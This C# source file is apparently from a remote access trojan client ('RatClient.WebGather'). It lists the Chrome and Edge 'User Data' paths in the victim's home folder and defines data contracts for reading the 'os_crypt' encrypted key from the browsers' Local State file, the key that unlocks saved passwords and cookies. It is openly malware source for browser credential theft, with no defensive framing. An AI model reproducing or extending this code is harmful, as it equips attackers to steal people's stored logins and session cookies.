using System.Collections.Generic;
using System.Runtime.Serialization;





namespace RatClient.WebGather
{
    public class WebInfo
    { 
        public static Dictionary<string, string> paths = new Dictionary<string, string>
        {
            { "chrome", $"{Info.UserInfo.UserHomePath}\\AppData\\Local\\Google\\Chrome\\User Data" },
            { "edge", $"{Info.UserInfo.UserHomePath}\\AppData\\Local\\Microsoft\\Edge\\User Data" }
        };
    }

    [DataContract]
    public class OsCrypt
    {
        [DataMember(Name = "encrypted_key")]
        public string EncryptedKey { get; set; }
    }

    [DataContract]
    public class Content
    {
        [DataMember(Name = "os_crypt")]
        public OsCrypt OsCrypt { get; set; }
    }
}
